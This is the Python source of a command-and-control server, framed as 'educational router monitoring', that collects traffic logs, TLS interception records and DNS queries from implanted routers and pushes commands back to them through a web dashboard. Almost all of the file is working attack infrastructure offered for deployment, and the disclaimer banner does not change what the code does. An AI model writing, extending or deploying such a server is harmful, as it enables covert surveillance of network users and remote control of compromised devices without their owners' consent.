#!/usr/bin/env python3
"""
C2 Server for Educational Router Monitoring
Deploy on Ubuntu VPS to monitor internal network traffic
"""

import asyncio
import websockets
import json
import sqlite3
import ssl
import os
import sys
import logging
import datetime
import base64
import hashlib
import hmac
from collections import defaultdict
from threading import Lock
import aiohttp
from aiohttp import web
import aiohttp_cors

class C2Server:
    def __init__(self, config):
        self.config = config
        self.clients = {}
        self.db_lock = Lock()
        self.traffic_buffer = defaultdict(list)
        
        # Set up logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('/var/log/c2_server.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger('C2Server')
        
        # Initialize database
        self.init_database()
        
    def init_database(self):
        """Initialize SQLite database for storing traffic data"""
        with self.db_lock:
            conn = sqlite3.connect(self.config['db_path'])
            cursor = conn.cursor()
            
            # Create tables
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS clients (
                    client_id TEXT PRIMARY KEY,
                    ip_address TEXT,
                    first_seen TIMESTAMP,
                    last_seen TIMESTAMP,
                    router_model TEXT,
                    firmware_version TEXT
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS traffic_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    client_id TEXT,
                    timestamp TIMESTAMP,
                    src_ip TEXT,
                    dst_ip TEXT,
                    src_port INTEGER,
                    dst_port INTEGER,
                    protocol TEXT,
                    packet_size INTEGER,
                    direction TEXT,
                    FOREIGN KEY (client_id) REFERENCES clients(client_id)
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS ssl_intercepts (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    client_id TEXT,
                    timestamp TIMESTAMP,
                    hostname TEXT,
                    client_ip TEXT,
                    cert_info TEXT,
                    FOREIGN KEY (client_id) REFERENCES clients(client_id)
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS dns_queries (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    client_id TEXT,
                    timestamp TIMESTAMP,
                    query_domain TEXT,
                    query_type TEXT,
                    response TEXT,
                    is_tunnel BOOLEAN,
                    FOREIGN KEY (client_id) REFERENCES clients(client_id)
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS commands (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    client_id TEXT,
                    timestamp TIMESTAMP,
                    command TEXT,
                    status TEXT,
                    result TEXT,
                    FOREIGN KEY (client_id) REFERENCES clients(client_id)
                )
            ''')
            
            conn.commit()
            conn.close()
            
    def verify_auth_token(self, token):
        """Verify client authentication token"""
        try:
            # Decode token
            decoded = base64.b64decode(token)
            data = json.loads(decoded)
            
            # Verify timestamp
            if abs(time.time() - data.get('timestamp', 0)) > 300:
                return False, None
                
            # Verify HMAC
            expected_hmac = hmac.new(
                self.config['auth_key'].encode(),
                f"{data['client_id']}:{data['timestamp']}".encode(),
                hashlib.sha256
            ).hexdigest()
            
            if data.get('hmac') == expected_hmac:
                return True, data['client_id']
                
        except Exception as e:
            self.logger.error(f"Auth verification failed: {e}")
            
        return False, None
        
    async def handle_client(self, websocket, path):
        """Handle router client connections"""
        client_id = None
        client_ip = websocket.remote_address[0]
        
        try:
            # Authentication
            auth_msg = await websocket.recv()
            auth_data = json.loads(auth_msg)
            
            valid, client_id = self.verify_auth_token(auth_data.get('token', ''))
            if not valid:
                await websocket.send(json.dumps({'error': 'Authentication failed'}))
                return
                
            # Register client
            self.clients[client_id] = {
                'websocket': websocket,
                'ip': client_ip,
                'connected_at': datetime.datetime.now()
            }
            
            # Update database
            with self.db_lock:
                conn = sqlite3.connect(self.config['db_path'])
                cursor = conn.cursor()
                cursor.execute('''
                    INSERT OR REPLACE INTO clients 
                    (client_id, ip_address, first_seen, last_seen, router_model, firmware_version)
                    VALUES (?, ?, COALESCE((SELECT first_seen FROM clients WHERE client_id = ?), ?), ?, ?, ?)
                ''', (client_id, client_ip, client_id, datetime.datetime.now(), 
                      auth_data.get('model', 'Unknown'), auth_data.get('version', 'Unknown'),
                      datetime.datetime.now()))
                conn.commit()
                conn.close()
                
            self.logger.info(f"Client {client_id} connected from {client_ip}")
            
            await websocket.send(json.dumps({
                'status': 'connected',
                'client_id': client_id
            }))
            
            # Handle messages
            async for message in websocket:
                try:
                    data = json.loads(message)
                    await self.process_client_data(client_id, data)
                except json.JSONDecodeError:
                    self.logger.error(f"Invalid JSON from {client_id}")
                    
        except websockets.exceptions.ConnectionClosed:
            self.logger.info(f"Client {client_id} disconnected")
        except Exception as e:
            self.logger.error(f"Error handling client {client_id}: {e}")
        finally:
            if client_id and client_id in self.clients:
                del self.clients[client_id]
                
    async def process_client_data(self, client_id, data):
        """Process data received from router client"""
        data_type = data.get('type')
        
        if data_type == 'traffic':
            # Store traffic data
            with self.db_lock:
                conn = sqlite3.connect(self.config['db_path'])
                cursor = conn.cursor()
                
                for packet in data.get('packets', []):
                    cursor.execute('''
                        INSERT INTO traffic_logs 
                        (client_id, timestamp, src_ip, dst_ip, src_port, dst_port, 
                         protocol, packet_size, direction)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
                    ''', (client_id, datetime.datetime.now(), packet['src_ip'], 
                          packet['dst_ip'], packet['src_port'], packet['dst_port'],
                          packet['protocol'], packet['size'], packet.get('direction', 'unknown')))
                          
                conn.commit()
                conn.close()
                
            # Buffer for real-time display
            self.traffic_buffer[client_id].extend(data.get('packets', []))
            if len(self.traffic_buffer[client_id]) > 1000:
                self.traffic_buffer[client_id] = self.traffic_buffer[client_id][-1000:]
                
        elif data_type == 'ssl_intercept':
            # Store SSL interception data
            with self.db_lock:
                conn = sqlite3.connect(self.config['db_path'])
                cursor = conn.cursor()
                cursor.execute('''
                    INSERT INTO ssl_intercepts 
                    (client_id, timestamp, hostname, client_ip, cert_info)
                    VALUES (?, ?, ?, ?, ?)
                ''', (client_id, datetime.datetime.now(), data['hostname'], 
                      data['client_ip'], json.dumps(data.get('cert_info', {}))))
                conn.commit()
                conn.close()
                
        elif data_type == 'dns_query':
            # Store DNS query
            with self.db_lock:
                conn = sqlite3.connect(self.config['db_path'])
                cursor = conn.cursor()
                cursor.execute('''
                    INSERT INTO dns_queries 
                    (client_id, timestamp, query_domain, query_type, response, is_tunnel)
                    VALUES (?, ?, ?, ?, ?, ?)
                ''', (client_id, datetime.datetime.now(), data['domain'], 
                      data.get('query_type', 'A'), data.get('response', ''),
                      data.get('is_tunnel', False)))
                conn.commit()
                conn.close()
                
        elif data_type == 'command_result':
            # Store command result
            with self.db_lock:
                conn = sqlite3.connect(self.config['db_path'])
                cursor = conn.cursor()
                cursor.execute('''
                    UPDATE commands 
                    SET status = ?, result = ?
                    WHERE id = ?
                ''', ('completed', json.dumps(data.get('result', {})), data['command_id']))
                conn.commit()
                conn.close()
                
    async def send_command(self, client_id, command):
        """Send command to specific router"""
        if client_id not in self.clients:
            return {'error': 'Client not connected'}
            
        # Store command in database
        with self.db_lock:
            conn = sqlite3.connect(self.config['db_path'])
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO commands (client_id, timestamp, command, status)
                VALUES (?, ?, ?, ?)
            ''', (client_id, datetime.datetime.now(), json.dumps(command), 'pending'))
            command_id = cursor.lastrowid
            conn.commit()
            conn.close()
            
        # Send to client
        command['command_id'] = command_id
        try:
            await self.clients[client_id]['websocket'].send(json.dumps(command))
            return {'success': True, 'command_id': command_id}
        except Exception as e:
            self.logger.error(f"Failed to send command to {client_id}: {e}")
            return {'error': str(e)}
            
    async def start_websocket_server(self):
        """Start WebSocket server for router connections"""
        # SSL context for secure connections
        ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ssl_context.load_cert_chain(
            self.config['ssl_cert'],
            self.config['ssl_key']
        )
        
        async with websockets.serve(
            self.handle_client,
            '0.0.0.0',
            self.config['websocket_port'],
            ssl=ssl_context
        ):
            self.logger.info(f"WebSocket server listening on port {self.config['websocket_port']}")
            await asyncio.Future()  # Run forever
            
    # Web Dashboard API endpoints
    async def dashboard_index(self, request):
        """Serve dashboard HTML"""
        return web.FileResponse('/var/www/c2_dashboard/index.html')
        
    async def api_clients(self, request):
        """Get connected clients"""
        with self.db_lock:
            conn = sqlite3.connect(self.config['db_path'])
            cursor = conn.cursor()
            cursor.execute('''
                SELECT client_id, ip_address, last_seen, router_model, firmware_version
                FROM clients
                ORDER BY last_seen DESC
            ''')
            clients = [dict(zip(['client_id', 'ip_address', 'last_seen', 'router_model', 'firmware_version'], row))
                      for row in cursor.fetchall()]
            conn.close()
            
        # Mark online clients
        for client in clients:
            client['online'] = client['client_id'] in self.clients
            
        return web.json_response(clients)
        
    async def api_traffic(self, request):
        """Get traffic logs"""
        client_id = request.query.get('client_id')
        limit = int(request.query.get('limit', 100))
        
        with self.db_lock:
            conn = sqlite3.connect(self.config['db_path'])
            cursor = conn.cursor()
            
            if client_id:
                cursor.execute('''
                    SELECT * FROM traffic_logs 
                    WHERE client_id = ?
                    ORDER BY timestamp DESC
                    LIMIT ?
                ''', (client_id, limit))
            else:
                cursor.execute('''
                    SELECT * FROM traffic_logs 
                    ORDER BY timestamp DESC
                    LIMIT ?
                ''', (limit,))
                
            columns = [desc[0] for desc in cursor.description]
            traffic = [dict(zip(columns, row)) for row in cursor.fetchall()]
            conn.close()
            
        return web.json_response(traffic)
        
    async def api_ssl_intercepts(self, request):
        """Get SSL interception logs"""
        client_id = request.query.get('client_id')
        
        with self.db_lock:
            conn = sqlite3.connect(self.config['db_path'])
            cursor = conn.cursor()
            
            if client_id:
                cursor.execute('''
                    SELECT * FROM ssl_intercepts 
                    WHERE client_id = ?
                    ORDER BY timestamp DESC
                ''', (client_id,))
            else:
                cursor.execute('''
                    SELECT * FROM ssl_intercepts 
                    ORDER BY timestamp DESC
                ''')
                
            columns = [desc[0] for desc in cursor.description]
            intercepts = [dict(zip(columns, row)) for row in cursor.fetchall()]
            conn.close()
            
        return web.json_response(intercepts)
        
    async def api_dns_queries(self, request):
        """Get DNS query logs"""
        client_id = request.query.get('client_id')
        
        with self.db_lock:
            conn = sqlite3.connect(self.config['db_path'])
            cursor = conn.cursor()
            
            if client_id:
                cursor.execute('''
                    SELECT * FROM dns_queries 
                    WHERE client_id = ?
                    ORDER BY timestamp DESC
                ''', (client_id,))
            else:
                cursor.execute('''
                    SELECT * FROM dns_queries 
                    ORDER BY timestamp DESC
                ''')
                
            columns = [desc[0] for desc in cursor.description]
            queries = [dict(zip(columns, row)) for row in cursor.fetchall()]
            conn.close()
            
        return web.json_response(queries)
        
    async def api_command(self, request):
        """Send command to router"""
        try:
            data = await request.json()
            client_id = data['client_id']
            command = data['command']
            
            result = await self.send_command(client_id, command)
            return web.json_response(result)
            
        except Exception as e:
            return web.json_response({'error': str(e)}, status=400)
            
    async def api_realtime_traffic(self, request):
        """WebSocket endpoint for real-time traffic"""
        ws = web.WebSocketResponse()
        await ws.prepare(request)
        
        client_id = request.query.get('client_id')
        
        try:
            while True:
                if client_id and client_id in self.traffic_buffer:
                    # Send buffered traffic
                    if self.traffic_buffer[client_id]:
                        await ws.send_json({
                            'type': 'traffic',
                            'data': self.traffic_buffer[client_id][-50:]  # Last 50 packets
                        })
                        
                await asyncio.sleep(1)  # Update every second
                
        except Exception as e:
            self.logger.error(f"WebSocket error: {e}")
        finally:
            await ws.close()
            
        return ws
        
    async def start_web_server(self):
        """Start web dashboard server"""
        app = web.Application()
        
        # Set up CORS
        cors = aiohttp_cors.setup(app, defaults={
            "*": aiohttp_cors.ResourceOptions(
                allow_credentials=True,
                expose_headers="*",
                allow_headers="*"
            )
        })
        
        # Add routes
        app.router.add_get('/', self.dashboard_index)
        app.router.add_get('/api/clients', self.api_clients)
        app.router.add_get('/api/traffic', self.api_traffic)
        app.router.add_get('/api/ssl-intercepts', self.api_ssl_intercepts)
        app.router.add_get('/api/dns-queries', self.api_dns_queries)
        app.router.add_post('/api/command', self.api_command)
        app.router.add_get('/ws/traffic', self.api_realtime_traffic)
        
        # Configure CORS on all routes
        for route in list(app.router.routes()):
            cors.add(route)
            
        # Static files
        app.router.add_static('/static', '/var/www/c2_dashboard/static')
        
        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, '0.0.0.0', self.config['web_port'])
        await site.start()
        
        self.logger.info(f"Web dashboard listening on port {self.config['web_port']}")
        
    async def run(self):
        """Run C2 server"""
        # Start both servers concurrently
        await asyncio.gather(
            self.start_websocket_server(),
            self.start_web_server()
        )


def load_config():
    """Load server configuration"""
    config = {
        'websocket_port': int(os.environ.get('C2_WS_PORT', 8443)),
        'web_port': int(os.environ.get('C2_WEB_PORT', 8080)),
        'db_path': os.environ.get('C2_DB_PATH', '/var/lib/c2_server/c2.db'),
        'ssl_cert': os.environ.get('C2_SSL_CERT', '/etc/c2_server/cert.pem'),
        'ssl_key': os.environ.get('C2_SSL_KEY', '/etc/c2_server/key.pem'),
        'auth_key': os.environ.get('C2_AUTH_KEY', 'change-this-secret-key')
    }
    
    return config
    

if __name__ == '__main__':
    import time
    
    # Ensure directories exist
    os.makedirs('/var/lib/c2_server', exist_ok=True)
    os.makedirs('/var/log', exist_ok=True)
    os.makedirs('/var/www/c2_dashboard/static', exist_ok=True)
    
    config = load_config()
    server = C2Server(config)
    
    print("=== C2 Server for Educational Router Monitoring ===")
    print("⚠️  For educational purposes only!")
    print(f"WebSocket port: {config['websocket_port']}")
    print(f"Dashboard port: {config['web_port']}")
    print("")
    
    try:
        asyncio.run(server.run())
    except KeyboardInterrupt:
        print("\nShutting down C2 server...")